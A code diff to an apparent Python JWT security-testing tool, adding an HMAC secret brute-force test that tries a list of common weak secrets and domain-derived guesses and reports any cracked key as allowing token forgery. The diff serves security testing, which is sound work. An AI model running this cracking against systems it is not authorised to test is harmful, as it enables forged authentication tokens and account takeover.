@@ -1,15 +1,19 @@
 """JWT security tester — pure Python base64 manipulation.
 
 Tests algorithm none bypass, algorithm confusion, empty signature,
-expiry enforcement, and KID injection. No external tools required.
+expiry enforcement, KID injection, and secret brute force.
+No external tools required.
 """
 
 from __future__ import annotations
 
 import base64
+import hashlib
+import hmac
 import json
 import time
 from typing import Any
+from urllib.parse import urlparse
 
 import aiohttp
 import structlog
@@ -200,4 +204,100 @@ async def test_jwt(token: str, target_url: str) -> dict[str, Any]:
                     results["kid_payload"] = kid_payload
                     break
 
+    # Test 6: Secret Brute Force (HS256/HS384/HS512 only)
+    orig_alg = header.get("alg", "").upper()
+    if orig_alg.startswith("HS"):
+        brute_result = _brute_force_secret(token, target_url)
+        if brute_result.get("cracked"):
+            results["weak_secret"] = True
+            results["cracked_secret"] = brute_result["secret"]
+            results["forged_token_possible"] = True
+        else:
+            results["weak_secret"] = False
+
     return results
+
+
+# ---------------------------------------------------------------------------
+# JWT Secret Brute Force
+# ---------------------------------------------------------------------------
+
+_COMMON_SECRETS = [
+    "secret", "password", "123456", "changeme", "admin", "test",
+    "development", "staging", "production", "jwt_secret", "my_secret",
+    "key", "private", "default", "token_secret", "hs256-secret",
+    "supersecret", "jwt-secret", "auth-secret", "s3cr3t", "jwt",
+    "hmac-secret", "signing-key", "app-secret", "api-secret",
+]
+
+
+def _generate_target_secrets(target_url: str) -> list[str]:
+    """Generate target-specific secret guesses from the domain."""
+    secrets: list[str] = []
+    try:
+        parsed = urlparse(target_url)
+        hostname = parsed.hostname or ""
+        # Extract name parts: "api.bugstore.com" → ["bugstore"]
+        parts = hostname.replace("www.", "").split(".")
+        names = [p for p in parts if len(p) > 2 and p not in ("com", "org", "net", "io", "dev")]
+    except Exception:
+        names = []
+
+    years = ["2024", "2025", "2026"]
+    for name in names:
+        secrets.append(name)
+        secrets.append(f"{name}_secret")
+        secrets.append(f"{name}_jwt")
+        secrets.append(f"{name}_key")
+        secrets.append(f"{name}_prod")
+        secrets.append(f"{name}_dev")
+        for year in years:
+            secrets.append(f"{name}_{year}")
+            secrets.append(f"{name}_secret_{year}")
+
+    return secrets
+
+
+def _brute_force_secret(token: str, target_url: str) -> dict[str, Any]:
+    """Try common secrets to crack HS256/384/512 JWT signature."""
+    parts = token.split(".")
+    if len(parts) != 3:
+        return {"cracked": False}
+
+    header, _, _ = _decode_jwt(token)
+    alg = header.get("alg", "HS256").upper()
+
+    # Map algorithm to hashlib name
+    hash_map = {"HS256": "sha256", "HS384": "sha384", "HS512": "sha512"}
+    hash_name = hash_map.get(alg)
+    if not hash_name:
+        return {"cracked": False}
+
+    # The signed data is "header.payload"
+    signed_data = f"{parts[0]}.{parts[1]}".encode()
+    # The actual signature from the token
+    actual_sig = parts[2]
+
+    # Build candidate list
+    candidates = list(_COMMON_SECRETS)
+    candidates.extend(_generate_target_secrets(target_url))
+    # Deduplicate while preserving order
+    seen: set[str] = set()
+    unique: list[str] = []
+    for c in candidates:
+        if c not in seen:
+            seen.add(c)
+            unique.append(c)
+
+    for candidate in unique:
+        try:
+            computed = hmac.new(
+                candidate.encode(), signed_data, hash_name,
+            ).digest()
+            computed_sig = base64.urlsafe_b64encode(computed).rstrip(b"=").decode()
+            if computed_sig == actual_sig:
+                return {"cracked": True, "secret": candidate, "algorithm": alg}
+        except Exception:
+            continue
+
+    return {"cracked": False}
